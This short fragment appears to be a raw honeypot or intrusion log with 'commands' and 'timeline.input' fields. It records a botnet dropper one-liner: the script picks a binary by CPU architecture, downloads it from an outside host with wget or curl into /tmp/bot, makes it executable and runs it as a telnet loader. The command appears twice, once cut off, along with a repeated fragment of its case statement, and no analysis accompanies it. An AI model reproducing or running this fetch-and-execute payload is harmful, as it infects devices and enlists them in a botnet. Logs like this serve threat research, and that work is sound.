commands: arch=$(uname -m); case $arch in i386|i486|i586|i686) f="main_x86";; x86_64) f="main_x86_64";; mips) f="main_mips";; mipsel) f="main_mpsl";; armv4l|armv4tl) f="main_arm";; armv5l|armv5tel) f="main_arm5";; armv6l) f="main_arm6";; armv7l) f="main_arm7";; powerpc) f="main_ppc";; m68k) f="main_m68k";; sh4) f="main_sh4";; sparc) f="main_spc";; *) exit 1;; esac; if command -v wget >/dev/null; then wget -O /tmp/bot http://skynet8.ydns.eu/$f; elif command -v curl >/dev/null; then curl -o /tmp/bot http://skynet8.ydns

timeline.input: arch=$(uname -m); case $arch in i386|i486|i586|i686) f="main_x86";; x86_64) f="main_x86_64";; mips) f="main_mips";; mipsel) f="main_mpsl";; armv4l|armv4tl) f="main_arm";; armv5l|armv5tel) f="main_arm5";; armv6l) f="main_arm6";; armv7l) f="main_arm7";; powerpc) f="main_ppc";; m68k) f="main_m68k";; sh4) f="main_sh4";; sparc) f="main_spc";; *) exit 1;; esac; if command -v wget >/dev/null; then wget -O /tmp/bot http://skynet8.ydns.eu/$f; elif command -v curl >/dev/null; then curl -o /tmp/bot http://skynet8.ydns.eu/$f; else exit 1; fi; chmod +x /tmp/bot; /tmp/bot loader.telnet
armv5tel) f=main_arm5 ;; armv6l) f=main_arm6 ;; armv7l) f=main_arm7 ;; powerpc) f=main_ppc ;; m68k) f=main_m68k ;; sh4) f=main_sh4 ;; sparc) f=main_spc ;; *) exit 1 ;; esac
